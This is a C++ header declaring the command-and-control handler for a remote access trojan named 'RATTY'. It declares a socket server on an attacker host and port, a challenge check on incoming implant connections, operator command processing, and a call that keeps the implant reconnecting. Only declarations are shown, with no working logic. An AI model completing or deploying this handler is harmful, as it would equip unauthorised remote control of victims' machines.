#ifndef RAT_HANDLER
#define RAT_HANDLER

#include <CLI11.hpp>
#include <ratsignal.hpp>

#include <iostream>
#include <utility>
#include <algorithm>
#include <random>

class Handler {
public:
    Handler(std::string lhost, int lport);
private:
    // determine if incoming connection is valid
    bool Challenge();
    // enable socket server
    void InitializeServer();
    // prompt user input
    void Interact();

    // generates random challenge string
    std::string GenerateChallenge();

    // take the content and create the RatPacket to send
    void SendPacket(const std::string& data, const MsgType& type);
    // inform RAT that handler has closed and should try continuing to reach out
    void CloseRat();
    // take input and evaluate it to a RATTY command
    std::pair<std::string, MsgType> ProcessCommand(const std::string& input);

    SOCKET rat_conn;
    std::string LHOST;
    int LPORT;
};

#endif